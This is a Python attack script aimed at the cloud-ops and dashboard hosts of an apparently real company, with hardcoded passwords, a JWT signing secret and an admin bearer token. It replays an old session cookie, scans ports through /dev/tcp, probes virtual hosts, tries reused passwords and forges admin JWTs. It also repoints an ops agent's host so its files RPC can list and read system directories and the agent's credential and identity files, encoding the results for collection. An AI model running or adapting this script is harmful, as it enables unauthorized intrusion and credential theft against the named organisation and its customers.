#!/usr/bin/env python3
# i29468 round3: cloud-ops old-session replay + port/vhost + password reuse; read 122.51.1.87 ops-agent config via dashboard files-RPC.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

OPS = "cloud-ops.lumiiai.cn"
OPSIP = "124.223.170.146"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
PASSWORD = "iGIqnu4f8UGepPjBtQRt"
REG_PW = "PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP"
OLD_SESS = "ses_lyFXJl21baL09eH6REZB1gqoVkOn84IMs9iahaj8kpA"
DASH = "dashboard.lumiiai.cn"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
START = time.time()

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v): print("R:%s:%s" % (k, _b(v)), flush=True)
def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout); return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def http(url, method="GET", body=None, headers=None, jar=None, save_jar=None, timeout=25, maxlen=200000):
    hf = "/tmp/h." + str(int(time.time()*1000))
    a = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-D", hf]
    if jar: a += ["-b", jar]
    if save_jar: a += ["-c", save_jar]
    for h in (headers or []): a += ["-H", h]
    if body is not None:
        a += ["-X", method, "--data-binary", body if isinstance(body, str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])):
            a += ["-H", "Content-Type: application/json"]
    elif method != "GET": a += ["-X", method]
    a += [url, "-w", "\n__C__%{http_code}"]
    rc, out, err = run(a, timeout=timeout + 15)
    t = out.decode("utf-8", "replace"); c = ""
    i = t.rfind("__C__")
    if i >= 0: c = t[i+5:].strip()[:3]; t = t[:i]
    try: hdrs = open(hf, "r", errors="replace").read()[-1500:]
    except Exception: hdrs = ""
    return {"code": c, "body": t[:maxlen], "headers": hdrs}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(uid, cust="aro"):
    now = int(time.time())
    hh = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pp = b64u(json.dumps({"userId": uid, "email": "p@x", "customer": cust, "role": "admin",
                          "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    return hh + "." + pp + "." + b64u(hmac.new(JWT_SECRET.encode(), (hh + "." + pp).encode(), hashlib.sha256).digest())

def ops(path, method="GET", body=None, headers=None, timeout=25, maxlen=100000):
    return http("https://%s%s" % (OPS, path), method=method, body=body, headers=headers, timeout=timeout, maxlen=maxlen)

# ===== A) old session replay =====
A = {}
ck = "Cookie: lumii_ops_session=" + OLD_SESS
for p in ["/api/auth/me", "/api/instances", "/api/users"]:
    A[p] = ops(p, headers=[ck], timeout=20, maxlen=2000)
    time.sleep(0.2)
# also try 2fa verify with old session (in case unverified)
A["2fa"] = ops("/api/auth/2fa/verify", method="POST", body={"code": "000000"}, headers=[ck], timeout=15, maxlen=500)
A["me_origin"] = ops("/api/auth/me", headers=[ck, "Origin: https://cloud-ops.lumiiai.cn", "Referer: https://cloud-ops.lumiiai.cn/"], timeout=15, maxlen=500)
R("OLDSESS", A)

# ===== B) port / vhost =====
ports = [8800, 55432, 5432, 3000, 8080, 9000, 6379, 2019, 80, 443, 22]
cmds = " ".join("timeout 4 bash -c 'echo > /dev/tcp/%s/%d' 2>/dev/null && echo %d-OPEN || echo %d-closed;" % (OPSIP, p, p, p) for p in ports)
rc, out, err = run(["bash", "-c", cmds], timeout=70)
R("PORTS", out.decode("utf-8", "replace")[:2000])
vh = {}
for h in ["cloud-admin.lumiiai.cn", "cloud.lumiiai.cn", "lumii-cloud", "cloud-ops.lumiiai.cn"]:
    vh[h] = http("https://%s/" % OPSIP, headers=["Host: " + h], timeout=15, maxlen=800)
    vh[h + "|api"] = http("https://%s/api/auth/me" % OPSIP, headers=["Host: " + h], timeout=15, maxlen=800)
    time.sleep(0.2)
R("VHOST", vh)

# ===== C) password reuse attempts =====
C = {}
for u, p in [("admin", REG_PW), ("admin", "correct-horse"), ("admin", "lumii")]:
    r = ops("/api/auth/login", method="POST", body={"username": u, "password": p}, timeout=20, maxlen=600)
    C[u + "|" + p[:6]] = r
    time.sleep(1.0)
R("PWTRY", C)

# ===== D) dashboard files-RPC on 122.51.1.87 =====
def dcall(path, method="GET", body=None, session=None, admin=False, timeout=40, maxlen=400000):
    a = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-w", "\n__C__%{http_code}"]
    if session: a += ["-H", "Cookie: session=" + session]
    if admin: a += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None: a += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": a += ["-X", method]
    a += ["https://%s%s" % (DASH, path)]
    rc, out, err = run(a, timeout=timeout + 15)
    t = out.decode("utf-8", "replace"); c = ""
    i = t.rfind("__C__")
    if i >= 0: c = t[i+5:].strip()[:3]; t = t[:i]
    return {"code": c, "body": t[:maxlen]}

D = {}
r = dcall("/api/admin/agents", admin=True, timeout=45)
try: agents = (json.loads(r["body"]) or {}).get("agents", [])
except Exception: agents = []
D["agents"] = {"code": r["code"], "n": len(agents), "sample": [{"id": a.get("id"), "customer": a.get("customer"), "ip": a.get("ip"), "sshUser": a.get("sshUser"), "name": a.get("name")} for a in agents[:5]]}
cand = [a for a in agents if (a.get("customer") == "aro" and a.get("id"))]
AID = cand[0]["id"] if cand else "agent-15a45493"
orig = {"ip": None, "sshUser": None}
for a in agents:
    if a.get("id") == AID: orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
D["pick"] = {"aid": AID, "orig": orig}
D["patch"] = dcall("/api/admin/agents", method="PATCH", admin=True,
                   body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25)
sess = forge("af0a2285-490f-11f1-ac43-525400595be1", "aro")

def ls(path):
    u = "/api/agents/%s/files?action=list&path=%s" % (AID, up.quote(path, safe="/"))
    return dcall(u, session=sess, timeout=30, maxlen=120000)
def rd(path):
    u = "/api/agents/%s/files?action=read&path=%s" % (AID, up.quote(path, safe="/"))
    return dcall(u, session=sess, timeout=30, maxlen=300000)

for p in ["/", "/etc", "/opt", "/var/lib", "/data", "/usr/local/bin"]:
    try:
        rr = ls(p)
        D["LS_" + re.sub(r'\W', '_', p)] = {"code": rr["code"], "body": rr["body"][:120000]}
    except Exception as e:
        D["LS_" + re.sub(r'\W', '_', p)] = {"err": repr(e)}
    time.sleep(0.2)

for p in ["/etc/lumii-ops-agent.env/.",
          "/etc/systemd/system/lumii-ops-agent.service",
          "/usr/lib/systemd/system/lumii-ops-agent.service",
          "/etc/lumii-ops-agent/config.json",
          "/var/lib/lumii-ops-agent/identity.json",
          "/var/lib/lumii-ops-agent/state.json",
          "/etc/lumii-ops-agent.env"]:
    try:
        rr = rd(p)
        D["RD_" + re.sub(r'\W', '_', p)] = {"code": rr["code"], "n": len(rr["body"]), "body": rr["body"][:80000]}
    except Exception as e:
        D["RD_" + re.sub(r'\W', '_', p)] = {"err": repr(e)}
    time.sleep(0.2)

D["restore"] = dcall("/api/admin/agents", method="PATCH", admin=True,
                     body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")}, timeout=25)
R("DASH", D)

R("DONE", {"elapsed": int(time.time() - START)})
print("ROUND3_DONE", flush=True)
